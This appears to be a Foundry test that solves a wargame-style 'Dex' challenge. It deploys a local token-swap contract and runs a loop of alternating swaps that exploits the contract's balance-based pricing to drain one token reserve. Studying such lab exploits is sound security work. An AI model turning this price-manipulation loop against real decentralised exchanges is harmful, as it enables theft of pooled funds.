// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract ElevatorHackerTest is Test {

  function test_hack() public {
    address deployer = makeAddr("deployer");
    address hacker = makeAddr("hacker");

    vm.startPrank(deployer, deployer);
    SwappableToken token1 = new SwappableToken(address(0), "Token1", "T1", 110);
    SwappableToken token2 = new SwappableToken(address(0), "Token2", "T2", 110);
    Dex dex = new Dex();
    dex.setTokens(address(token1), address(token2));
    token1.transfer(address(dex), 100);
    token2.transfer(address(dex), 100);
    token1.transfer(hacker, 10);
    token2.transfer(hacker, 10);
    console.log("Token1 balance of hacker: %d", token1.balanceOf(hacker));
    console.log("Token2 balance of hacker: %d", token2.balanceOf(hacker));

    vm.startPrank(hacker, hacker);
    uint256 cost = 10;
    uint8 tokenIndex = 0;
    SwappableToken[2] memory tokens = [token1, token2];
    while (true) {
      SwappableToken fromToken = tokens[(tokenIndex + 1) % 2];
      SwappableToken toToken = tokens[tokenIndex];
      fromToken.approve(address(dex), cost);
      dex.swap(address(fromToken), address(toToken), cost);
      if (toToken.balanceOf(address(dex)) == 0) {
        break;
      }

      cost = toToken.balanceOf(hacker);
      uint256 price = dex.getSwapPrice(address(toToken), address(fromToken), cost);
      uint256 maxOut = fromToken.balanceOf(address(dex));
      if (price > maxOut) {
        cost = cost * maxOut / price;
      }

      tokenIndex = (tokenIndex + 1) % 2;
    }

    vm.assertTrue(token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0);
  }
}